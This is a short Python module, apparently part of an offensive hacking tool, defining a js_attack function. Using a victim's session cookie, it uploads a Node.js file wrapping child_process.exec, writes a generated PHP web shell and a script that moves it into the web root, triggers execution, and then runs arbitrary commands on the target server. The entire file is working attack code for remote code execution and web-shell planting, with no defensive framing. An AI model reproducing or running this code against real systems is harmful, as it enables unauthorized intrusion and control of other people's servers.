#!/usr/bin/env python


from http import http
from config import *
from function  import *
from urllib import quote

# u may need to change this one
js_filename = ".2"

def js_attack(target,cmd,cookie):
    header = {"Cookie":cookie}
    res = "error"
    #print cmd 
    cmd = quote(cmd)
    #write js file
    from file_write import file_write
    from js_exe import js_exe
    file_write(target,"2",'exports.a=function(c){return require("child_process").exec(c);}',cookie)
    
    #write tmp php file
    shell_name,shell,encode_shell = generate_shell(target,"")
    file_write(target,"3",shell,cookie)
    
    #write sh file 
    shell_content = "mv 3 " + shell_absolute_path + "/" +shell_name
    file_write(target,"4",shell_content,cookie)

    #execute sh file
    js_exe(target,"2",cookie)
    
    res = execute_shell(target,cmd) 
    
    return res  
